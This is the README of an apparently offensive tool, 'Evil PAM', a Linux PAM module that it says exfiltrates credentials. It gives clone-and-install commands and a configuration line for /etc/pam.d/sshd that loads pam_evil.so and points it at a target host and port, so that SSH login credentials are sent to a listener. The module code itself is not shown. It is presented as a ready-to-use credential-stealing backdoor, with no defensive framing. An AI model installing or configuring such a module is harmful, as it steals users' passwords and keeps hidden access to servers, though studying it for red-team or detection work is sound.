# Evil PAM
PAM module to exfiltrate credentials

## Usage

Install the module:
```
git clone https://github.com/itasahobby/pam_evil.git
make install
```

Configure SSH to use the PAM module adding the following to `/etc/pam.d/sshd`:
```
auth       optional     pam_evil.so target=127.0.0.1 port=8888
```

## Mentions
In colaboration with [Dreg](https://github.com/David-Reguera-Garcia-Dreg/)

## References
* https://web.archive.org/web/20190523222819/https://fedetask.com/write-linux-pam-module/
* https://unix.stackexchange.com/questions/428437/pam-pam-sm-authenticate-try-to-get-get-user-and-password-of-non-esixting-users

## Mentions
Idea inspired by Dreg
